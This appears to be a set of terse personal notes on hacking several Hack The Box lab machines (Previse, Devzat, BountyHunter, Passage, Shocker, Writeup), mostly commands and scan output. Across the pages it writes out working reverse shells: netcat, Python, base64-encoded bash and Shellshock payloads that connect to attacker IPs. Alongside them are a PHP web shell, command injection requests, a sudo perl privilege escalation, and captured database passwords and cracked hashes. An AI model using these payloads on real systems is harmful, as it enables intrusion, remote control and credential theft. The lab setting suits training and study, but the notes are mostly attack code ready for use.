/>swearwords%5B%2Ffuck%2Fe%5D=system(&#39;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.13.16.70%2080%20%3E%2Ftmp%2Ff&#39;)&amp;swearwords%5B%2Fshit%2Fi%5D=poop&amp;swearwords%5B%2Fass%2Fi%5D=behind&amp;swearwords%5B%2Fdick%2Fi%5D=penis&amp;swearwords%5B%2Fwhore%2Fi%5D=escort&amp;swearwords%5B%2Fasshole%2Fi%5D=bad+person&amp;to=test%40test.com&amp;subject=test&amp;message=%3Cp%3Efuck+shit%3Cbr%3E%3C%2Fp%3E&amp;_wysihtml5_mode=1<br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-2'>Previse.htb</h1><br/>ORT   STATE SERVICE REASON         VERSION                                                                                                                                                                                                                   <br />22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                                                                                                              <br />| ssh-hostkey:                                                                                                                                                                                                                                                <br />|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)                                                                 <br />| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U+bBa/UyMNxMjkPO+rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB+KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q+i+gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI+k9kT2gYslacuTwQhacntIh2XFo0YtfY+dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd<br />|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)                                                                <br />| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF+aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4=<br />|   256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)                                                                                                                                                                                             <br />|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv+Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps                                                                                                                                                                            <br />80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))                                                                                                                                                                                            <br />| http-cookie-flags:                                           <br />|   /:                                                         <br />|     PHPSESSID:                                               <br />|_      httponly flag not set                                  <br />|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004                                                                                                                                                                                         <br />| http-methods:                                                <br />|_  Supported Methods: GET HEAD POST OPTIONS                                                                                   <br />|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                   <br />| http-title: Previse Login                                    <br />|_Requested resource was login.php                                                                                             <br />Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                                                                                         <br />OS fingerprint not ideal because: Missing a closed TCP port so results incomplete                                                                                                                                                                             <br />Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)<br />No exact OS matches for host (test conditions non-ideal).                                                                      <br />TCP/IP fingerprint:                                            <br />SCAN(V=7.91%E=4%D=10/3%OT=22%CT=%CU=38120%PV=Y%DS=2%DC=T%G=N%TM=6159FD0F%P=x86_64-pc-linux-gnu)                                                                                                                                                               <br />SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)                                                                                  <br />OPS(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%O6=M54BST11)                                                                                                                                                                  <br />WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)                                                                           <br />ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)                                                                                 <br />T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)                                                                                        <br />T2(R=N)                                                        <br />T3(R=N)                                                        <br />T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)                                                                                   <br />T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)                                                                                 <br />T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)                                                                                   <br />T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)                                                                                 <br />U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)                                                                                                                                                                                              <br />IE(R=Y%DFI=N%T=40%CD=S)                                        <br /><br /><br /><br />go through the pages in Burp history.<br /><br />accounts.php has register form<br /><br />save it to local post a user (name and pass should be more than 5 chars)<br /><br /><div class="codebox"><pre>        &lt;form role=<span style="color:#5ebdab;font-weight:400">&quot;form&quot;</span> method=<span style="color:#5ebdab;font-weight:400">&quot;post&quot;</span> action=<span style="color:#5ebdab;font-weight:400">&quot;http://10.10.11.104/accounts.php&quot;</span>&gt;<br />            &lt;div class=<span style="color:#5ebdab;font-weight:400">&quot;uk-margin&quot;</span>&gt;<br />                &lt;div class=<span style="color:#5ebdab;font-weight:400">&quot;uk-inline&quot;</span>&gt;<br />                    &lt;span class=<span style="color:#5ebdab;font-weight:400">&quot;uk-form-icon&quot;</span> uk-icon=<span style="color:#5ebdab;font-weight:400">&quot;icon: user&quot;</span>&gt;&lt;<span style="color:#bf2e5e;font-weight:400">/</span>span&gt;<br />                    &lt;input type=<span style="color:#5ebdab;font-weight:400">&quot;text&quot;</span> name=<span style="color:#5ebdab;font-weight:400">&quot;username&quot;</span> class=<span style="color:#5ebdab;font-weight:400">&quot;uk-input&quot;</span> <span style="color:#bf2e5e;font-weight:400">id</span>=<span style="color:#5ebdab;font-weight:400">&quot;username&quot;</span> placeholder=<span style="color:#5ebdab;font-weight:400">&quot;Username&quot;</span>&gt;<br />                &lt;<span style="color:#bf2e5e;font-weight:400">/</span>div&gt;<br />            &lt;<span style="color:#bf2e5e;font-weight:400">/</span>div&gt;<br />            &lt;div class=<span style="color:#5ebdab;font-weight:400">&quot;uk-margin&quot;</span>&gt;<br />                &lt;div class=<span style="color:#5ebdab;font-weight:400">&quot;uk-inline&quot;</span>&gt;<br />                    &lt;span class=<span style="color:#5ebdab;font-weight:400">&quot;uk-form-icon&quot;</span> uk-icon=<span style="color:#5ebdab;font-weight:400">&quot;icon: lock&quot;</span>&gt;&lt;<span style="color:#bf2e5e;font-weight:400">/</span>span&gt;<br />                    &lt;input type=<span style="color:#5ebdab;font-weight:400">&quot;password&quot;</span> name=<span style="color:#5ebdab;font-weight:400">&quot;password&quot;</span> class=<span style="color:#5ebdab;font-weight:400">&quot;uk-input&quot;</span> <span style="color:#bf2e5e;font-weight:400">id</span>=<span style="color:#5ebdab;font-weight:400">&quot;password&quot;</span> placeholder=<span style="color:#5ebdab;font-weight:400">&quot;Password&quot;</span>&gt;<br />                &lt;<span style="color:#bf2e5e;font-weight:400">/</span>div&gt;<br />            &lt;<span style="color:#bf2e5e;font-weight:400">/</span>div&gt;<br />            &lt;div class=<span style="color:#5ebdab;font-weight:400">&quot;uk-margin&quot;</span>&gt;<br />                &lt;div class=<span style="color:#5ebdab;font-weight:400">&quot;uk-inline&quot;</span>&gt;<br />                    &lt;span class=<span style="color:#5ebdab;font-weight:400">&quot;uk-form-icon&quot;</span> uk-icon=<span style="color:#5ebdab;font-weight:400">&quot;icon: lock&quot;</span>&gt;&lt;<span style="color:#bf2e5e;font-weight:400">/</span>span&gt;<br />                    &lt;input type=<span style="color:#5ebdab;font-weight:400">&quot;password&quot;</span> name=<span style="color:#5ebdab;font-weight:400">&quot;confirm&quot;</span> class=<span style="color:#5ebdab;font-weight:400">&quot;uk-input&quot;</span> <span style="color:#bf2e5e;font-weight:400">id</span>=<span style="color:#5ebdab;font-weight:400">&quot;confirm&quot;</span> placeholder=<span style="color:#5ebdab;font-weight:400">&quot;Confirm Password&quot;</span>&gt;<br />                &lt;<span style="color:#bf2e5e;font-weight:400">/</span>div&gt;<br />            &lt;<span style="color:#bf2e5e;font-weight:400">/</span>div&gt;<br />            &lt;button type=<span style="color:#5ebdab;font-weight:400">&quot;submit&quot;</span> name=<span style="color:#5ebdab;font-weight:400">&quot;submit&quot;</span> class=<span style="color:#5ebdab;font-weight:400">&quot;uk-button uk-button-default&quot;</span>&gt;CREATE USER&lt;<span style="color:#bf2e5e;font-weight:400">/</span>button&gt;<br />        &lt;<span style="color:#bf2e5e;font-weight:400">/</span>form&gt;</pre></div><br /><br /><br />m4lwhere<br /><br />sitebackup.zip<br /><br />cat config.php                                             <br />&lt;?php                                                          <br /><br />function connectDB(){                                          <br />    $host = &#39;localhost&#39;;                                       <br />    $user = &#39;root&#39;;                                            <br />    $passwd = &#39;mySQL_p@ssw0rd!:)&#39;;                             <br />    $db = &#39;previse&#39;;                                           <br />    $mycon = new mysqli($host, $user, $passwd, $db);           <br />    return $mycon;                                             <br />}                                                              <br /><br />?&gt; <br /><br /><br />&lt;?<em>php</em> system($_<em>GET</em>[&#39;<em>cmd</em>&#39;]);?&gt; <br /><br /><br />logs.php<br /><br />/////////////////////////////////////////////////////////////////////////////////////<br />//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//<br />/////////////////////////////////////////////////////////////////////////////////////<br /><br />$output = exec(&quot;/usr/bin/python /opt/scripts/log_process.py {$_POST[&#39;delim&#39;]}&quot;);<br />echo $output;<br /><br /><br /><br />comma &amp;&amp; python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.6&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;<br /><br /><div class="codebox"><pre>POST <span style="color:#bf2e5e;font-weight:400">/</span>logs.php HTTP<span style="color:#bf2e5e;font-weight:400">/</span>1.1<br />Host<span style="color:#bf2e5e;font-weight:400">:</span> 10.10.11.104<br />User-Agent<span style="color:#bf2e5e;font-weight:400">:</span> Mozilla<span style="color:#bf2e5e;font-weight:400">/</span>5.0 <span style="color:#bf2e5e;font-weight:400">(</span>X11<span style="color:#bf2e5e;font-weight:400">;</span> Linux x86_64<span style="color:#bf2e5e;font-weight:400">;</span> rv<span style="color:#bf2e5e;font-weight:400">:</span>78.0<span style="color:#bf2e5e;font-weight:400">)</span> Gecko<span style="color:#bf2e5e;font-weight:400">/</span>20100101 Firefox<span style="color:#bf2e5e;font-weight:400">/</span>78.0<br />Accept<span style="color:#bf2e5e;font-weight:400">:</span> text<span style="color:#bf2e5e;font-weight:400">/</span>html,application<span style="color:#bf2e5e;font-weight:400">/</span>xhtml+xml,application<span style="color:#bf2e5e;font-weight:400">/</span>xml<span style="color:#bf2e5e;font-weight:400">;</span>q=0.9,image<span style="color:#bf2e5e;font-weight:400">/</span>webp,*<span style="color:#bf2e5e;font-weight:400">/</span>*<span style="color:#bf2e5e;font-weight:400">;</span>q=0.8<br />Accept-Language<span style="color:#bf2e5e;font-weight:400">:</span> en-US,en<span style="color:#bf2e5e;font-weight:400">;</span>q=0.5<br />Accept-Encoding<span style="color:#bf2e5e;font-weight:400">:</span> <span style="color:#bf2e5e;font-weight:400">gzip</span>, deflate<br />Content-Type<span style="color:#bf2e5e;font-weight:400">:</span> application<span style="color:#bf2e5e;font-weight:400">/</span>x-www-form-urlencoded<br />Content-Length<span style="color:#bf2e5e;font-weight:400">:</span> 263<br />Origin<span style="color:#bf2e5e;font-weight:400">:</span> http<span style="color:#bf2e5e;font-weight:400">://</span>10.10.11.104<br />Connection<span style="color:#bf2e5e;font-weight:400">:</span> close<br />Referer<span style="color:#bf2e5e;font-weight:400">:</span> http<span style="color:#bf2e5e;font-weight:400">://</span>10.10.11.104<span style="color:#bf2e5e;font-weight:400">/</span>file_logs.php<br />Cookie<span style="color:#bf2e5e;font-weight:400">:</span> PHPSESSID=02mgmr7r8q86vihq17kr56r3a1<br />Upgrade-Insecure-Requests<span style="color:#bf2e5e;font-weight:400">:</span> 1<br /><br /><span style="color:#9755b3;font-weight:400">delim</span>=comma+%26%26+python+-c+<span style="color:#5ebdab;font-weight:400">&#39;import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((&quot;10.10.16.6&quot;,6666))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])%3b&#39;</span></pre></div><br /><br />$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.<br /><br /><br />m4lwhere: ilovecody112235!</div><div class='page'><h1 class='title level-2'>devzat.htb</h1><br/>PORT     STATE SERVICE REASON         VERSION                                                                                                                                                                                 <br />22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)                                                                                                                            <br />| ssh-hostkey:                                                                                                                                                                                                                <br />|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)                                                                                                                                                                <br />| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNaY36GNxswLsvQjgdNt0oBgiJp/OExsv55LjY72WFW03eiJrOY5hbm5AjjyePPTm2N9HO7uK230THXoGWOXhrlzT3nU/g/DkQyDcFZioiE7M2eRIK2m4egM5SYGcKvXDtQqSK86ex4I31Nq6m9EVpVWphbLfvaWjRmIgOlURo+P76WgjzZzKw<br />s42mag2zIrn5oP+ODhOW/3ta289/EMYS6phUbBd0KJIWm9ciNfKA2D7kklnuUP1ZRBe2DbSvd2HV5spoLQKmtY37JEX7aYdETjDUHvTqgkWsVCZAa5qNswPEV7zFlAJTgtW8tZsjW86Q0H49M5dUPra4BEXfZ0/idJy+jpMkbfj6+VjlsvaxxvNUEVrbPBXe9SlbeXdrNla5nenpbwtWNhckUlsEZj<br />lpv8VnHqXt99s1mfHJkgO+yF09gvVPVdglDSqMAla8d2rfaVD68RfoGQc10Af6xiohSOA8LIa0f4Yaw+PjLlcylF5APDnSjtQvHm8TnQyRaVM=                                                                                                                <br />|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)                                                                                                                                                               <br />| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCenH4vaESizD5ZgkV+1Yo3MJH9MfmUdKhvU+2Z2ShSSWjp1AfRmK/U/rYaFOoeKFIjo1P4s8fz3eXr3Pzk/X80=                                                            <br />|   256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)                                                                                                                                                             <br />|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKTxLGFW04ssWG0kheQptJmR5sHKtPI2G+zh4FVF0pBm                                                                                                                                            <br />80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41                                                                                                                                                                     <br />| http-methods:                                                                                                                                                                                                               <br />|_  Supported Methods: OPTIONS HEAD GET POST                                                                                                                                                                                  <br />|_http-server-header: Apache/2.4.41 (Ubuntu)<br />|_http-title: devzat - where the devs at<br />8000/tcp open  ssh     syn-ack ttl 63 (protocol 2.0)<br />| fingerprint-strings: <br />|   NULL: <br />|_    SSH-2.0-Go<br />| ssh-hostkey: <br />|   3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)<br />|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTPm8Ze7iuUlabZ99t6SWJTw3spK5GP21qE/f7FOT/P+crNvZQKLuSHughKWgZH7Tku7Nmu/WxhZwVUFDpkiDG1mSPeK6uyGpuTmncComFvD3CaldFrZCNxbQ/BbWeyNVpF9szeVTwfdgY5PNoQFQ0reSwtenV6atEA5WfrZzhSZXWuWEn+7HB<br />9C6w1aaqikPQDQSxRArcLZY5cgjNy34ZMk7MLaWciK99/xEYuNEAbR1v0/8ItVv5pyD8QMFD+s2NwHk6eJ3hqks2F5VJeqIZL2gXvBmgvQJ8fBLb0pBN6xa1xkOAPpQkrBL0pEEqKFQsdJaIzDpCBGmEL0E/DfO6Dsyq+dmcFstxwfvNO84OmoD2UArb/PxZPaOowjE47GRHl68cDIi3ULKjKoMg2Q<br />D7zrayfc7KXP8qEO0j5Xws0nXMll6VO9Gun6k9yaXkEvrFjfLucqIErd7eLtRvDFwcfw0VdflSdmfEz/NkV8kFpXm7iopTKdcwNcqjNnS1TIs=<br /><br /><br /><br /><br /><br />/root/go/bin/ffuf -c -u <a href="http://devzat.htb">http://devzat.htb</a> -H &quot;Host: FUZZ.devzat.htb&quot; -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200<br /><br /><br /><code>{&quot;name&quot;:&quot;Test&quot;,&quot;species&quot;:&quot;`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzgwIDA+JjE=|base64 -d|bash`&quot;}</code></div><div class='page'><h1 class='title level-2'>bountyhunter.htb</h1><br/><br /><br /><br /><br />root:x:0:0:root:/root:/bin/bash<br />daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br />bin:x:2:2:bin:/bin:/usr/sbin/nologin<br />sys:x:3:3:sys:/dev:/usr/sbin/nologin<br />sync:x:4:65534:sync:/bin:/bin/sync<br />games:x:5:60:games:/usr/games:/usr/sbin/nologin<br />man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br />lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br />mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br />news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br />uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br />proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br />www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br />backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br />list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br />irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br />gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br />nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br />systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br />systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br />systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br />messagebus:x:103:106::/nonexistent:/usr/sbin/nologin<br />syslog:x:104:110::/home/syslog:/usr/sbin/nologin<br />_apt:x:105:65534::/nonexistent:/usr/sbin/nologin<br />tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false<br />uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin<br />tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin<br />landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin<br />pollinate:x:110:1::/var/cache/pollinate:/bin/false<br />sshd:x:111:65534::/run/sshd:/usr/sbin/nologin<br />systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br />development:x:1000:1000:Development:/home/development:/bin/bash<br />lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false<br />usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin<br /><br />&lt;?php<br />// TODO -&gt; Implement login system with the database.<br />$dbserver = &quot;localhost&quot;;<br />$dbname = &quot;bounty&quot;;<br />$dbusername = &quot;admin&quot;;<br />$dbpassword = &quot;m19RoAU0hP41A1sTsq6K&quot;;<br />$testuser = &quot;test&quot;;<br />?&gt;<br /><br />development:m19RoAU0hP41A1sTsq6K<br /><br /># Skytrain Inc<br />## Ticket to Bash<br />__Ticket Code:__<br />**102 + 7 and __import__(&#39;os&#39;).system(&#39;ipconfig&#39;) == True<br /><br />OR<br />myway:<br />**102 + 7 and exec(&quot;import os;os.system(&#39;ipconfig&#39;)&quot;) == True</div><div class='page'><h1 class='title level-2'>passage.htb</h1><br/><br /><br />cutenews.py <br /><br /><br />echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzgwIDA+JjE= | base64 -d | bash<br /><br /><br />decrypt hashes on <a href="https://crackstation.net/">https://crackstation.net/</a><br /><br /><table class="table"><tr><th>7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1</th><th>Unknown</th><th>Not found.</th></tr><tr><td>4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88</td><td>Unknown</td><td>Not found.</td></tr><tr><td>e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd</td><td>sha256</td><td>atlanta1</td></tr><tr><td>f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca</td><td>Unknown</td><td>Not found.</td></tr><tr><td>4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc</td><td>sha256</td><td>egre55</td></tr></table><br /><br /><br />su paul:atlanta1<br /></div><div class='page'><h1 class='title level-2'>shocker.htb</h1><br/>─# nmap -A -p- 10.10.10.56 <br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-07-15 11:52 +03<br />Nmap scan report for 10.10.10.56<br />Host is up (0.086s latency).<br />Not shown: 65533 closed ports<br />PORT     STATE SERVICE VERSION<br />80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)<br />|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)<br />|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=7/15%OT=80%CT=1%CU=40678%PV=Y%DS=2%DC=T%G=Y%TM=60EFF7F<br />OS:6%P=x86_64-pc-linux-gnu)SEQ(TI=Z%CI=I%TS=8)SEQ(SP=105%GCD=1%ISR=10E%TI=Z<br />OS:%TS=8)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=RD%TS=8)OPS(O1=NNT11%O2=M54BST11N<br />OS:W6%O3=NNT11%O4=M54BST11NW6%O5=NNT11%O6=M54BST11)WIN(W1=1C5%W2=7120%W3=1C<br />OS:5%W4=7120%W5=1C5%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW6%CC=Y%Q=)T<br />OS:1(R=Y%DF=Y%T=40%S=O%A=O%F=A%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=1C5%S=O%A=O%F=A%O<br />OS:=NNT11%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=1C5%S=O%A=O%F=A%O=NNT11%<br />OS:RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W<br />OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)<br />OS:U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%D<br />OS:FI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 5900/tcp)<br />HOP RTT      ADDRESS<br />1   99.33 ms 10.10.16.1<br />2   99.42 ms 10.10.10.56<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 185.91 seconds<br /><br /><br /><br />gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56/cgi-bin/ -x sh,cgi<br /><br />user.sh<br /><br />TEST<br />wget -U “() { test;};echo \”Content-type: text/plain\&quot;; echo; /bin/bash -c &#39;echo vulnerable&#39;&quot; <a href="http://192.168.169.139/cgi-bin/status">http://192.168.169.139/cgi-bin/status</a><br /><br />REVERSE SHELL<br />wget -U &quot;() { test;};echo \&quot;Content-type: text/plain\&quot;; echo; /bin/bash -i &gt;&amp; /dev/tcp/10.10.16.10/6666 0&gt;&amp;1&quot; <a href="http://10.10.10.56/cgi-bin/user.sh">http://10.10.10.56/cgi-bin/user.sh</a><br /><br /><br />sudo -l<br /><br />sudo perl -e &#39;exec &quot;/bin/sh&quot;;&#39;<br /><br /></div><div class='page'><h1 class='title level-2'>writeup.htb</h1><br/><br /> rustscan -a 10.10.10.138 --ulimit 5000 -- -A           <br />.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br />| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |<br />| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |<br />`-&#39; `-&#39;`-----&#39;`----&#39;  `-&#39;  `----&#39;  `---&#39; `-&#39;  `-&#39;`-&#39; `-&#39;<br />The Modern Day Port Scanner.<br />________________________________________<br />: <a href="https://discord.gg/GFrQsGy">https://discord.gg/GFrQsGy</a>           :<br />: <a href="https://github.com/RustScan/RustScan">https://github.com/RustScan/RustScan</a> :<br /> --------------------------------------<br />Nmap? More like slowmap.🐢<br /><br />[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;<br />[~] Automatically increasing ulimit value to 5000.<br />Open 10.10.10.138:22<br />Open 10.10.10.138:80<br />[~] Starting Script(s)<br />[&gt;] Script to be run Some(&quot;nmap -vvv -p {{port}} {{ip}}&quot;)<br /><br />[~] Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-07-18 19:44 +03<br />NSE: Loaded 153 scripts for scanning.<br />NSE: Script Pre-scanning.<br />NSE: Starting runlevel 1 (of 3) scan.<br />Initiating NSE at 19:44<br />Completed NSE at 19:44, 0.00s elapsed<br />NSE: Starting runlevel 2 (of 3) scan.<br />Initiating NSE at 19:44<br />Completed NSE at 19:44, 0.00s elapsed<br />NSE: Starting runlevel 3 (of 3) scan.<br />Initiating NSE at 19:44<br />Completed NSE at 19:44, 0.00s elapsed<br />Initiating Ping Scan at 19:44<br />Scanning 10.10.10.138 [4 ports]<br />Completed Ping Scan at 19:44, 0.12s elapsed (1 total hosts)<br />Initiating Parallel DNS resolution of 1 host. at 19:44<br />Completed Parallel DNS resolution of 1 host. at 19:44, 0.02s elapsed<br />DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]<br />Initiating SYN Stealth Scan at 19:44<br />Scanning 10.10.10.138 [2 ports]<br />Discovered open port 80/tcp on 10.10.10.138<br />Discovered open port 22/tcp on 10.10.10.138<br />Completed SYN Stealth Scan at 19:44, 0.11s elapsed (2 total ports)<br />Initiating Service scan at 19:44<br />Scanning 2 services on 10.10.10.138<br />Completed Service scan at 19:45, 6.18s elapsed (2 services on 1 host)<br />Initiating OS detection (try #1) against 10.10.10.138<br />Retrying OS detection (try #2) against 10.10.10.138<br />Initiating Traceroute at 19:45<br />Completed Traceroute at 19:45, 0.11s elapsed<br />Initiating Parallel DNS resolution of 2 hosts. at 19:45<br />Completed Parallel DNS resolution of 2 hosts. at 19:45, 0.02s elapsed<br />DNS resolution of 2 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]<br />NSE: Script scanning 10.10.10.138.<br />NSE: Starting runlevel 1 (of 3) scan.<br />Initiating NSE at 19:45<br />Completed NSE at 19:45, 10.55s elapsed<br />NSE: Starting runlevel 2 (of 3) scan.<br />Initiating NSE at 19:45<br />Completed NSE at 19:45, 1.08s elapsed<br />NSE: Starting runlevel 3 (of 3) scan.<br />Initiating NSE at 19:45<br />Completed NSE at 19:45, 0.00s elapsed<br />Nmap scan report for 10.10.10.138<br />Host is up, received echo-reply ttl 63 (0.085s latency).<br />Scanned at 2021-07-18 19:44:58 +03 for 23s<br /><br />PORT   STATE SERVICE REASON         VERSION<br />22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 